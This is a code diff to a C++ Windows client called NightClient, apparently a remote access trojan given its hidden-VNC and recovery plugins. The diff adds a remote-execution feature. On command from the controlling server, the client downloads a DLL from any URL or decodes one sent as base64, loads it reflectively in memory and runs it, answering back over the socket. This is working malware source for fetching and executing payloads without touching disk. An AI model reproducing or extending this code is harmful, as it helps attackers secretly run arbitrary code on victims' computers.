@@ -12,6 +12,10 @@
 #include <cstdint>
 #include "../include/json.hpp"
 #include "../include/PluginManager.hpp"
+#include "../include/MemoryLoader.hpp"
+#include <wininet.h>
+#include <algorithm>
+#pragma comment(lib, "wininet.lib")
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -86,6 +90,56 @@ struct PacketHeader {
 };
 #pragma pack(pop)
 
+static vector<uint8_t> base64_decode(const string& in) {
+    vector<uint8_t> out;
+    vector<int> T(256, -1);
+    for (int i = 0; i < 64; i++) {
+        T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
+    }
+    int val = 0, valb = -8;
+    for (unsigned char c : in) {
+        if (T[c] == -1) continue;
+        val = (val << 6) + T[c];
+        valb += 6;
+        if (valb >= 0) {
+            out.push_back((uint8_t)((val >> valb) & 0xFF));
+            valb -= 8;
+        }
+        val &= 0xFFFFFF;
+    }
+    return out;
+}
+
+static string toLower(string str) {
+    transform(str.begin(), str.end(), str.begin(), ::tolower);
+    return str;
+}
+
+static bool endsWith(const string& str, const string& suffix) {
+    if (str.length() >= suffix.length()) {
+        return (0 == str.compare(str.length() - suffix.length(), suffix.length(), suffix));
+    }
+    return false;
+}
+
+static vector<unsigned char> downloadToMemory(const string& url) {
+    vector<unsigned char> buffer;
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (hInternet) {
+        HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        if (hUrl) {
+            unsigned char temp[4096];
+            DWORD bytesRead = 0;
+            while (InternetReadFile(hUrl, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
+                buffer.insert(buffer.end(), temp, temp + bytesRead);
+            }
+            InternetCloseHandle(hUrl);
+        }
+        InternetCloseHandle(hInternet);
+    }
+    return buffer;
+}
+
 class NightClient {
 private:
     SOCKET sock;
@@ -104,6 +158,7 @@ private:
     const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
     const string HIDDEN_VNC_PLUGIN_ID = "HiddenVNCPlugin";
     const string RECOVERY_PLUGIN_ID = "RecoveryPlugin";
+    const string REMOTE_EXECUTION_PLUGIN_ID = "RemoteExecutionPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -205,6 +260,90 @@ private:
         }
     }
 
+    void sendResponse(const string& status, const string& message) {
+        json j;
+        j["action"] = "remote_execute_response";
+        j["status"] = status;
+        j["message"] = message;
+        send_data(j);
+    }
+
+    void execute_remote_execution_command(const json& data) {
+        string action = data.value("action", "");
+
+        if (action == "remote_execute_local") {
+            string filename = data.value("filename", "");
+            if (endsWith(toLower(filename), ".dll")) {
+                string content64 = data.value("content", "");
+                if (content64.empty()) {
+                    sendResponse("error", "DLL content is empty");
+                    return;
+                }
+
+                vector<uint8_t> decodedBytes = base64_decode(content64);
+                vector<unsigned char> buffer(decodedBytes.begin(), decodedBytes.end());
+
+                HMODULE hMod = MemoryLoader::Load(buffer);
+                if (hMod) {
+                    typedef void (*PluginEntry)(SOCKET);
+                    PluginEntry func = (PluginEntry)MemoryLoader::GetExportAddress(hMod, "RunPlugin");
+                    if (func) {
+                        SOCKET currentSock = sock;
+                        thread([func, currentSock]() {
+                            try { func(currentSock); } catch (...) {}
+                        }).detach();
+                        sendResponse("success", "Successfully loaded DLL reflectively from memory and executed RunPlugin.");
+                    } else {
+                        sendResponse("success", "Successfully loaded DLL reflectively from memory (RunPlugin export not found).");
+                    }
+                } else {
+                    sendResponse("error", "Failed to reflectively load DLL from memory");
+                }
+                return;
+            }
+        }
+        else if (action == "remote_execute_url") {
+            string url = data.value("url", "");
+            if (endsWith(toLower(url), ".dll")) {
+                SOCKET currentSock = sock;
+                thread([this, url, currentSock]() {
+                    vector<unsigned char> downloadedBytes = downloadToMemory(url);
+                    if (downloadedBytes.empty()) {
+                        sendResponse("error", "Failed to download DLL into memory");
+                        return;
+                    }
+
+                    HMODULE hMod = MemoryLoader::Load(downloadedBytes);
+                    if (hMod) {
+                        typedef void (*PluginEntry)(SOCKET);
+                        PluginEntry func = (PluginEntry)MemoryLoader::GetExportAddress(hMod, "RunPlugin");
+                        if (func) {
+                            try {
+                                thread([func, currentSock]() {
+                                    try { func(currentSock); } catch (...) {}
+                                }).detach();
+                                sendResponse("success", "Successfully downloaded, reflectively loaded DLL, and executed RunPlugin.");
+                            } catch (...) {
+                                sendResponse("error", "Exception while starting reflective DLL execution thread");
+                            }
+                        } else {
+                            sendResponse("success", "Successfully downloaded and reflectively loaded DLL (RunPlugin export not found).");
+                        }
+                    } else {
+                        sendResponse("error", "Failed to reflectively load downloaded DLL from memory");
+                    }
+                }).detach();
+                return;
+            }
+        }
+
+        if (pluginMgr.isPluginLoaded(REMOTE_EXECUTION_PLUGIN_ID)) {
+            pluginMgr.executePluginCommand(REMOTE_EXECUTION_PLUGIN_ID, "HandleCommand", sock, data.dump());
+        } else {
+            request_plugin(REMOTE_EXECUTION_PLUGIN_ID, data);
+        }
+    }
+
     void process_json_command(const string& json_str) {
         try {
             auto data = json::parse(json_str);
@@ -247,6 +386,9 @@ private:
 			}
             else if (action == "recovery") {
                 execute_recovery_command(data);
+            }
+            else if (action == "remote_execute_url" || action == "remote_execute_local") {
+                execute_remote_execution_command(data);
             }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
@@ -371,6 +513,12 @@ private:
                                     thread([this, currentSock]() {
                                         pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", currentSock);
                                     }).detach();
+                                } else if (pluginId == REMOTE_EXECUTION_PLUGIN_ID) {
+                                    if (hasPendingPluginCommand) {
+                                        pluginMgr.executePluginCommand(REMOTE_EXECUTION_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
+                                    } else {
+                                        pluginMgr.executePlugin(REMOTE_EXECUTION_PLUGIN_ID, "RunPlugin", sock);
+                                    }
                                 }
                             }
 
